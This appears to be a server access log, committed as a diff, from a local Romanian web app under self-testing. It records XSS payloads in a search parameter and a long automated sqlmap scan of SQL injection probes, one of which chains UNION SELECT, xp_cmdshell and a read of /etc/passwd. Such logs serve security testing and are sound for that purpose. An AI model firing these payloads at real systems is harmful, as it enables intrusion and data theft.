+[2026-01-19T22:36:55.333Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:36:55.334Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:36:55.402Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:37:03.647Z] GET /cauta?q=%3Cscript%3Ealert(%27atac%20XSS%27)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:37:03.649Z] GET /cauta?q=%3Cscript%3Ealert(%27atac%20XSS%27)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:37:03.758Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:38:22.775Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:38:22.779Z] GET /profile-image/utilizator - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:38:24.306Z] GET /logout - 200 - IP: ::1 - LOGOUT SUCCESS - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:38:24.308Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:38:24.309Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-19T22:40:56.268Z] GET / - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:16:38.678Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:38.686Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:58.967Z] GET /cauta?nume=ion&cYaJ=4346%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:58.968Z] GET /cauta?nume=ion&cYaJ=4346%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.003Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.004Z] GET /cauta?nume=ion - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.021Z] GET /cauta?nume=ion%22%28%27%28%29%2C%29%2C%29%28 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.022Z] GET /cauta?nume=ion%22%28%27%28%29%2C%29%2C%29%28 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.062Z] GET /cauta?nume=ion%27bYJAYc%3C%27%22%3EHcbNGU - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.064Z] GET /cauta?nume=ion%27bYJAYc%3C%27%22%3EHcbNGU - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.120Z] GET /cauta?nume=ion%27%29%20AND%207640%3D4416%20AND%20%28%27Tyqm%27%3D%27Tyqm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.120Z] GET /cauta?nume=ion%27%29%20AND%207640%3D4416%20AND%20%28%27Tyqm%27%3D%27Tyqm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.139Z] GET /cauta?nume=ion%27%29%20AND%203249%3D3249%20AND%20%28%27BHWK%27%3D%27BHWK - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.140Z] GET /cauta?nume=ion%27%29%20AND%203249%3D3249%20AND%20%28%27BHWK%27%3D%27BHWK - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.156Z] GET /cauta?nume=ion%27%20AND%208391%3D3577%20AND%20%27SVMl%27%3D%27SVMl - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.157Z] GET /cauta?nume=ion%27%20AND%208391%3D3577%20AND%20%27SVMl%27%3D%27SVMl - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.178Z] GET /cauta?nume=ion%27%20AND%203249%3D3249%20AND%20%27zBdo%27%3D%27zBdo - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.179Z] GET /cauta?nume=ion%27%20AND%203249%3D3249%20AND%20%27zBdo%27%3D%27zBdo - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.217Z] GET /cauta?nume=ion%29%20AND%209494%3D4134%20AND%20%287222%3D7222 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.217Z] GET /cauta?nume=ion%29%20AND%209494%3D4134%20AND%20%287222%3D7222 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.231Z] GET /cauta?nume=ion%29%20AND%203249%3D3249%20AND%20%284230%3D4230 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.232Z] GET /cauta?nume=ion%29%20AND%203249%3D3249%20AND%20%284230%3D4230 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.266Z] GET /cauta?nume=ion%20AND%203908%3D4853 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.267Z] GET /cauta?nume=ion%20AND%203908%3D4853 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.282Z] GET /cauta?nume=ion%20AND%203249%3D3249 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.283Z] GET /cauta?nume=ion%20AND%203249%3D3249 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.313Z] GET /cauta?nume=ion%20AND%203926%3D6520--%20WEzG - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.314Z] GET /cauta?nume=ion%20AND%203926%3D6520--%20WEzG - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.329Z] GET /cauta?nume=ion%20AND%203249%3D3249--%20OeCg - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.330Z] GET /cauta?nume=ion%20AND%203249%3D3249--%20OeCg - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.401Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%285242%3D5209%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%205209%20UNION%20SELECT%207700%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.402Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%285242%3D5209%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%205209%20UNION%20SELECT%207700%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.415Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%289002%3D9002%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%204557%20UNION%20SELECT%209834%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.416Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%289002%3D9002%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%204557%20UNION%20SELECT%209834%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.540Z] GET /cauta?nume=ion%27%29%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%28%27KPuH%27%3D%27KPuH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.541Z] GET /cauta?nume=ion%27%29%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%28%27KPuH%27%3D%27KPuH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.554Z] GET /cauta?nume=ion%27%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%27ZOHv%27%3D%27ZOHv - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.555Z] GET /cauta?nume=ion%27%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%27ZOHv%27%3D%27ZOHv - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.591Z] GET /cauta?nume=ion%29%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%288849%3D8849 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.592Z] GET /cauta?nume=ion%29%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29%20AND%20%288849%3D8849 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.609Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.610Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.622Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29--%20SFbe - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.643Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%284028%2CCONCAT%280x5c%2C0x7178787671%2C%28SELECT%20%28ELT%284028%3D4028%2C1%29%29%29%2C0x716a6b7a71%29%29--%20SFbe - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.677Z] GET /cauta?nume=ion%27%29%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27KMcr%27%3D%27KMcr - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.678Z] GET /cauta?nume=ion%27%29%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27KMcr%27%3D%27KMcr - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.692Z] GET /cauta?nume=ion%27%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27Fopy%27%3D%27Fopy - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.693Z] GET /cauta?nume=ion%27%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27Fopy%27%3D%27Fopy - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.708Z] GET /cauta?nume=ion%29%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%287566%3D7566 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.709Z] GET /cauta?nume=ion%29%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%287566%3D7566 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.724Z] GET /cauta?nume=ion%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.725Z] GET /cauta?nume=ion%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.737Z] GET /cauta?nume=ion%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20OzYb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.739Z] GET /cauta?nume=ion%20AND%209895%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289895%3D9895%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20OzYb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.755Z] GET /cauta?nume=ion%27%29%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%28%27mgjQ%27%3D%27mgjQ - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.757Z] GET /cauta?nume=ion%27%29%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%28%27mgjQ%27%3D%27mgjQ - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.782Z] GET /cauta?nume=ion%27%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27znUD%27%3D%27znUD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.784Z] GET /cauta?nume=ion%27%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%27znUD%27%3D%27znUD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.812Z] GET /cauta?nume=ion%29%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%288461%3D8461 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.813Z] GET /cauta?nume=ion%29%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%288461%3D8461 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.827Z] GET /cauta?nume=ion%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.828Z] GET /cauta?nume=ion%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.855Z] GET /cauta?nume=ion%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20gIiD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.856Z] GET /cauta?nume=ion%20AND%204978%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%284978%3D4978%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20gIiD - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.888Z] GET /cauta?nume=ion%27%29%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27dyzb%27%3D%27dyzb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-20T09:16:59.889Z] GET /cauta?nume=ion%27%29%20AND%201332%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281332%3D1332%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27dyzb%27%3D%27dyzb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
